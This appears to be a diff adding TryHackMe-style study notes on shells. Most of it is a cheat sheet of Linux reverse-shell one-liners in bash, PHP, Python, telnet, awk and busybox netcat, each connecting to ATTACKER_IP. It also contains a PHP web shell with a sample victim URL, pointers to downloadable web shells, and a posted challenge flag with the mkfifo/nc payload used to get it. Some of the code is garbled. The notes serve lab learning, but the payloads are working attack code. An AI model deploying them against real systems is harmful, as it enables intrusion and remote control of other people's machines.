@@ -153,3 +153,126 @@ attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
 
 ## Conclusion: 
 These tools provide various functionalities to listen for incoming reverse shells, enhancing the attacker's ability to manage interactions with compromised systems.
+
+# Shell Payloads 
+
+## Introduction 
+This document discusses various shell payloads used in Linux to create reverse shells. These payloads enable an attacker to control a target machine by exposing the shell to an incoming connection. 
+
+## Key Points 
+
+### Bash Reverse Shells 
+1. Normal Bash Reverse Shell 
+• Command: `bash -i &gt; /dev/tcp/ATTACKER_IP/443 0&gt;&amp;1` 
+• Creates an interactive bash shell that connects to the attacker’s IP on port 443. 
+
+2. Bash Read Line Reverse Shell 
+• Command: `exec 5&lt;&gt;/dev/tcp/ATTACKER_IP/443; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done` 
+• Establishes a TCP socket and executes commands sent via that socket while sending output back. 
+
+3. Bash With File Descriptor 196 Reverse Shell 
+• Command: `0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ATTACKER_IP/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196` 
+• Uses file descriptor 196 to read commands from and send output to a TCP connection. 
+
+4. Bash With File Descriptor 5 Reverse Shell 
+• Command: `bash -i 5&lt;&gt; /dev/tcp/ATTACKER_IP/443 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5` 
+• Similar to the first example, using file descriptor 5 for input and output on the TCP connection. 
+
+### PHP Reverse Shells 
+1. Using the exec Function 
+• Command: `php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh &lt;&amp;3 &gt;3 2&gt;&amp;3");'` 
+• Creates a socket connection and executes a shell. 
+
+2. Using the shell_exec Function 
+• Command: `php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh &lt;&amp;3 &gt;3 2&gt;&amp;3");'` 
+• Similar to the exec function but uses shell_exec. 
+
+3. Using the system Function 
+• Command: `php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh &lt;&amp;3 &gt;3 2&gt;&amp;3");'` 
+• Executes a command and outputs it to the browser. 
+
+4. Using the passthru Function 
+• Command: `php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh &lt;&amp;3 &gt;3 2&gt;&amp;3");'` 
+• Executes a shell and sends raw output back. 
+
+5. Using the popen Function 
+• Command: `php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh &lt;&amp;3 &gt;3 2&gt;&amp;3", "r");'` 
+• Opens a process file pointer to execute the shell. 
+
+### Python Reverse Shells 
+1. Using Environment Variables 
+• Command: `export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket. socket();s. connect((os. getenv("RHOST"),int(os. getenv("RPORT"))));[os. dup2(s. fileno(),fd) for fd in (0,1,2)];pty. spawn("bash")'` 
+• Sets remote host and port, connects through a socket, and spawns a shell. 
+
+2. Using the subprocess Module 
+• Command: `PY-C 'import socket,subprocess,os;s=socket. socket(socket. AF_INET,socket. SOCK_STREAM);s. connect(("ATTACKER_IP",443));os. dup2(s. fileno(),0); os. dup2(s. fileno(),1);os. dup2(s. fileno(),2);import pty; pty. spawn("bash")'` 
+• Uses subprocess to create a similar environment. 
+
+3. Short Python Reverse Shell 
+• Command: `PY-C 'import os,pty,socket;s=socket. socket();s. connect(("ATTACKER_IP",443));[os. dup2(s. fileno(),f)for f in(0,1,2)];pty. spawn("bash")'` 
+• Connects to the attacker and redirects input/output. 
+
+### Other Methods 
+1. Telnet 
+• Command: `TF=$(mktemp -u); mkfifo $TF &amp;&amp; telnet ATTACKER_IP 443 0&lt;$TF | sh 1&gt;$TF` 
+• Uses a named pipe with Telnet to connect to the attacker. 
+
+2. AWK 
+• Command: `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c ! = "exit") close(s); }}' /dev/null` 
+• Utilizes AWK’s TCP capabilities to create a reverse shell. 
+
+3. BusyBox 
+• Command: `busybox nc ATTACKER_IP 443 -e sh` 
+• Connects to the attacker using Netcat and executes the shell. 
+
+### Conclusion 
+The document presents a variety of methods to create reverse shells in Linux using Bash, PHP, Python, and other tools. Each example demonstrates how to connect to an attacker's IP and allows execution of commands remotely.
+
+
+# Web Shells 
+
+## Introduction: 
+A web shell is a script that runs on a hacked web server, allowing attackers to execute commands through the server. It usually hides within a compromised application, making it hard to find. 
+
+## Key Points: 
+• Web shells are commonly written in server-supported languages like PHP, ASP, JSP, and CGI scripts. 
+
+• An example of a PHP web shell includes a basic script that executes commands passed through a URL. For instance: 
+
+```php 
+ php 
+if (isset($_GET['cmd'])) { 
+system($_GET['cmd']); 
+} 
+? &gt; 
+``` 
+• This script can be saved as shell. php and uploaded to the web server through various vulnerabilities, allowing the attacker to access it by going to a specific URL, such as: 
+`http://victim.com/uploads/shell. php? cmd=whoami`. 
+
+• There are existing web shells available online with varying functionalities, including:
+
+• p0wny-shell: A simple PHP web shell for remote command execution. 
+
+• b374k shell: A more advanced PHP web shell that manages files and executes commands. 
+
+• c99 shell: A robust PHP web shell with extensive features. 
+
+## Conclusion: 
+Web shells exploit web server vulnerabilities, enabling attackers to execute commands remotely while remaining undetected. More web shells can be found at: https://www. r57shell.net/index. php.
+
+# Try Hack me Challenge
+
+- Q: Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?
+- A: THM{0f28b3e1b00becf15d01a1151baf10####bc625}
+- Guide: First access the website for the rev shell exercise.
+        # Then open a listener with netcat: nc - lvpn PORT
+        # Then, in the input form use the following: 
+         ```bash
+         rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc MACHINE_IP PORT >/tmp/f
+         ```
+        # After getting access, all left to do is: cd / | cat flag.txt
+
+![alt text](image-2.png)
+
+- Q: Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?
+
